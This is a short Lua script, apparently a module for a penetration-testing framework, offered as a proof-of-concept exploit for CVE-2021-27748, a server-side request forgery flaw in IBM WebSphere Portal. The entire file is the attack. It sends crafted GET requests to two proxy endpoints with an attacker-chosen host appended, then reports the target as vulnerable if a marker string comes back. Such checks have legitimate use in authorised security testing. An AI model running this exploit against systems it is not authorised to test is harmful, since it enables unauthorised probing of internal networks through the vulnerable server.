local http = require("http")

METADATA = {
    AUTHOR = {"farinap5 <farinap5@protonmail.com>"},
    VERSION = "1.0",
    TAGS = {"websphere","http","ssrf","cve"},
    INFO = [[IBM websphere portal exploit Poc for CVE-2021-27748]]
}

-- Arguments/Variables needed to execute script
VARS = {
    RHOST = {VALUE="example.com", NEEDED="yes", DESCRIPT="Remote Host"},
    RPORT = {VALUE="443", NEEDED="no", DESCRIPT="Remote Port"},
    PHOST = {VALUE="example.com", NEEDED="no", DESCRIPT="POC Host"},
    PSTR =  {VALUE="illustrative examples", NEEDED="no", DESCRIPT="POC string"},
    SSL =   {VALUE="true", NEEDED="no", DESCRIPT="User HTTPS schema"},
}

function Init()
    Meta(METADATA) -- Load metadata 
    LoadVars(VARS) -- Load variables
end

function Main()
    local client = http.client()

    local schema = ((VARS.SSL.VALUE == "true") and "https://" or "http://")
    schema = schema .. VARS.RHOST.VALUE .. ":" ..VARS.RPORT.VALUE
    schema = schema .. "/"
    local exp1 = schema .. "/docpicker/internal_proxy/https/" .. VARS.PHOST.VALUE

    local request = http.request("GET", exp1)
    local result, err = client:do_request(request)
    if err then
        Println(err)
        return
    end
    if string.find(result.body, VARS.PSTR.VALUE) then
        PrintSuccsln("Host looks vulnerable to CVE-2021-27748")
        return
    end


    local exp2 = schema .. "/wps/PA_WCM_Authoring_UI/proxy/http/" .. VARS.PHOST.VALUE
    local request2 = http.request("GET", exp2)
    local result2, err = client:do_request(request2)
    if err then
        Println(err)
        return
    end
    if string.find(result2.body, VARS.PSTR.VALUE) then
        PrintSuccsln("Host looks vulnerable to CVE-2021-27748")
        return
    end
end